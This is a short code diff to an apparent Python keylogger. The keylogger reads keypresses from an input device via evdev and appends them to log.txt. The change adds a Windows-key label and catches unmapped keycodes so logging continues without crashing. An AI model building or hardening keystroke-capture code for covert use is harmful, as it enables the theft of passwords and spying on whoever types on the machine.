@@ -104,6 +104,7 @@ key_code_map = {
     110: ' <INSERT> ',
     111: ' <DELETE> ',
     112: ' <MACRO> ',
+    125: ' <WINDOWS_KEY> '
 }
 
 
@@ -111,7 +112,10 @@ async def keylog(dev):
     with open('log.txt', 'a+') as f:
         async for event in dev.async_read_loop():
             if event.type == ecodes.EV_KEY and event.value == 1:
-                f.write(key_code_map[event.code])
+                try:
+                    f.write(key_code_map[event.code])
+                except KeyError:
+                    f.write(f" <Unmapped keycode: {event.code}> ")
 
 
 if __name__ == "__main__":
